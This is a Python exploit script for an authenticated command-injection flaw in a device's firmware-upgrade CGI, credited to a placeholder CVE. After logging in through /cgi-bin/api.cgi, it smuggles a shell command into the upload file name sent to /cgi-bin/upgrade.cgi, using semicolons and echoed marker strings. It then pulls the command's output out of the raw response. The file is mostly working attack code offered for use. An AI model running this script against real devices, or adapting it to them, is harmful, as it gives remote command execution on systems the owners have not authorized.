import sys
import time
import getopt
import requests
import socket

from pwn import *
from termcolor import colored, cprint
from img2banner.img2banner import covertImageToAscii


def banner():
    # conver img to banner
    aimg = covertImageToAscii("logo.png", 80, 0.43, True, debug=False) 
    print colored("\n".join(aimg), 'red', attrs=["dark"])
    print ""
    print colored("\t\tSpecial thanks for the author(s) of this CVE (CVE-2020-XXX1): @xploited", "blue")


def recvall(sock):
    BUFF_SIZE = 1024 # 4 KiB
    data = b''
    while True:
        part = sock.recv(BUFF_SIZE)
        data += part
        if "_3Quoodryo" in data:
            break
    return data

def main():
    try:
        opts, args = getopt.getopt(sys.argv[1:], "ht:c:r:vq", ["help", "output="])
    except getopt.GetoptError as err:
        # print help information and exit:
        print(err) # will print something like "option -a not recognized"
        usage()
        sys.exit(2)
    output = None
    verbose = False
    target = None
    run = None
    quiet = False
    username, password = None, None
    for o, a in opts:
        if o == "-v":
            verbose = True
        elif o in ("-q", "--quiet"):
            quiet = True
        elif o in ("-h", "--help"):
            usage()
            sys.exit()
        elif o in ("-r", "--run"):
            run = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-c", "--creds"):
            if ":" not in a:
                log.error("Wrong formatted credentials. ':' not present!")
                sys.exit(2)
            username, password = a.split(":",1)
        else:
            assert False, "unhandled option"
    if not target:
        log.warn("Target missing! Use '-t'")
        sys.exit(2)
    if not username or not password:
        log.warn("Credentials missing! Use '-c'")
        sys.exit(2)
    if not quiet:
        banner()


    s = requests.Session()
    data = {
            "user": username,
            "passwd": password,
            "command": "login"
    }
    time.sleep(1)
    if not quiet:
        p = log.progress('Working')
        p.status("Logging in with '{}:{}'".format(username, password))
    r = s.post(target + "/cgi-bin/api.cgi", data=data)

    if not 'Set-Cookie' in r.headers.keys():
        log.warn("Login failed!")
        sys.exit(4)

    cookies = {} 
    cookie_name, cookie_val = r.headers['Set-Cookie'].split("; ")[0].split('=', 1)
    cookies[cookie_name] = cookie_val
    time.sleep(1)

    files = {
            'noredirect': (None, "/index.cs?page=system.firmwareupgrade"),
            'type': (None, "http"),
            'uploadfile': (";echo -n hejCeik6ow;{};echo -n _3Quoodryo".format(run), "empty")
            }
    r = requests.Request("POST", target + "/cgi-bin/upgrade.cgi", cookies=cookies, files=files)
    _r = r.prepare()
    _h = "\r\n".join(["{}: {}".format(k,v) for k, v in _r.headers.items()])

    if not quiet:
        p = log.progress('Working')
        p.status("Running Command '{}'".format(run))
    s = socket.socket(
    socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((target.replace("http://", ""), 80))
    except socket.error as msg:
        log.warn("Issues connecting to server!")
        s.close()
        sys.exit(5)
    raw = "{} {} HTTP/1.1\r\n{}\r\n\r\n{}".format(_r.method, _r.url, _h, _r.body)
    s.sendall(raw)
    data = recvall(s)
    s.close()
    output = data[data.index("hejCeik6ow")+10:data.index("_3Quoodryo")]
    print output

if __name__ == "__main__":
    main()
